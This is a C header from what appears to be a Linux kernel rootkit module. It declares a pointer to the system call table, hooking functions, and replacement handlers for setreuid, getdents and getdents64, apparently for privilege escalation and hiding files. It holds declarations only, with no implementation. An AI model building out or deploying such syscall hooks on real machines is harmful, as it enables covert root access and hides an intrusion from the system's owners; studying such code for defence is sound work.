#ifndef _R0MOD_GLOBAL_H
#   define _R0MOD_GLOBAL_H

#   include <linux/module.h>
#   include <linux/version.h>
#   include <linux/unistd.h>
#   include <linux/slab.h>
#   include <linux/list.h>
#   include <linux/fs.h>
#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
#       include <generated/autoconf.h>
#   else
#       include <linux/autoconf.h>
#   endif
#   include <config.h>

// Debugging definitions
#   if __DEBUG__
#       define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#   else
#       define DEBUG(fmt, ...)
#   endif

#   if __DEBUG_HOOK__
#       define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
#   else
#       define DEBUG_HOOK(fmt, ...)
#   endif

struct linux_dirent
{
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

struct linux_dirent64
{
    u64             d_ino;
    s64             d_off;
    unsigned short  d_reclen;
    unsigned char   d_type;
    char            d_name[0];
};

extern unsigned long *sct;

void hook_start(void *target, void *new);
void hook_pause(void *target);
void hook_resume(void *target);
void hook_stop(void *target);

char *strnstr(const char *haystack, const char *needle, size_t n);
void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
void *memstr(const void *haystack, const char *needle, size_t size);

//extern asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid);

//extern asmlinkage int (*sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int n_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

//extern asmlinkage int (*sys_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage int n_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

void init_hooks(void);
void exit_hooks(void);

#endif
